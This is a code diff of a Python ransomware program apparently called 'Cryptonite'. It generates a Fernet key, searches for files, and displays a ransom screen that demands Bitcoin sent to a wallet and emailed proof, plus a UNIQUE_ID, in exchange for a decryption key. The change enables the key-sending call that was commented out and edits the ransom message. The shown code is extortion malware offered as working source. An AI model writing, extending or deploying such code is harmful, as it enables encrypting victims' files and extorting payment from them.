@@ -20,7 +20,8 @@ import pymsgbox as pmb
 key = Fernet.generate_key()
 fe = Fernet(key)
 dkrpt = random.randint(100000, 999999)
-uniqKey = str(datetime.now().time()).strip().replace(':', '').replace('.', '')
+uniqKey = str(datetime.now()).replace(" ", "").replace("-", "").replace(":", "").replace(".", "")
+# print(dkrpt)
 
 # some GLOBALS
 
@@ -175,11 +176,11 @@ class System(Cryptonite):
                     self.decrypt()
                     window.destroy()
                 else:
-                    pmb.confirm("Wrong KEY!\tGoodBye :)", buttons=['OK'])
+                    pmb.confirm("Wrong KEY!", buttons=['OK'])
                     window.destroy()
                     exit()
             except:
-                pmb.confirm("Wrong KEY!\tGoodBye :)", buttons=['OK'])
+                pmb.confirm("Wrong KEY!", buttons=['OK'])
                 window.destroy()
                 exit()
 
@@ -215,9 +216,9 @@ class System(Cryptonite):
         lbl_main1.grid(row = 4, column = 0, columnspan = 2)
         lbl_main1 = tk.Label(master = frm_main, text = "What you can do?", font=("Apple Chancery", 20), bg = "black", fg = "#39ff14")
         lbl_main1.grid(row = 5, column = 0, columnspan = 2)
-        lbl_main1 = tk.Label(master = frm_main, text = "Don't worry! Your files can still be decrypted.\nYou just need to put in the correct DECRYPTION_KEY in the text box provided.\n\nIn order to get the DECRYPTION_KEY, 1. Send us the specified amount of BTC in the address mentioned below. 2. Send us the\nvalid screenshots via email along with your UNIQUE_ID. Do that and we will provide the correct DECRYPTION_KEY via mail.\n\nRemember! You will have only ONE CHANCE to enter the DECRYPTION_KEY.\n\nSo, do not try to be a Smart Alec.", font=("Apple Chancery", 15), bg = "black", fg = "#39ff14")
+        lbl_main1 = tk.Label(master = frm_main, text = "Don't worry! Your files can still be decrypted.\nYou just need to put in the correct DECRYPTION_KEY in the text box provided.\n\nIn order to get the DECRYPTION_KEY, 1. Send us the specified amount of BTC to the address mentioned below. 2. Send us the\nvalid screenshots via email along with your UNIQUE_ID. Do that and we will provide the correct DECRYPTION_KEY via mail.\n\nRemember! You will have only ONE CHANCE to enter the DECRYPTION_KEY.\n\nSo, do not try to be a Smart Alec.", font=("Apple Chancery", 15), bg = "black", fg = "#39ff14")
         lbl_main1.grid(row = 6, column = 0, columnspan = 2)
-        lbl_main1 = tk.Label(master = frm_main, text = f"BTC WALLET: {BTC_WALLET}\tBTC AMOUNT: {BTC_AMOUNT}\tEMAIL: {EMAIL} \t", font=("Apple Chancery", 10), bg = "black", fg = "#39ff14")
+        lbl_main1 = tk.Label(master = frm_main, text = f"BTC AMOUNT: {BTC_AMOUNT}\tBTC WALLET: {BTC_WALLET}\tEMAIL: {EMAIL}\t", font=("Apple Chancery", 10), bg = "black", fg = "#39ff14")
         lbl_main1.grid(row = 7, column = 0, sticky = "w", columnspan = 2)
         lbl_main1 = tk.Label(master = frm_main, text = f"UNIQUE_ID: {self.uniqueKey}", font=("Apple Chancery", 10), bg = "black", fg = "#39ff14")
         lbl_main1.grid(row = 7, column = 0, sticky = "e", columnspan = 2)
@@ -249,6 +250,6 @@ if __name__ == "__main__":
     cryptn8 = Cryptonite(key,fe,dkrpt,uniqKey)
     window = System()
 
-    # cryptn8.sendKeys()
+    cryptn8.sendKeys()
     cryptn8.findFiles()
     window.warningScreen()
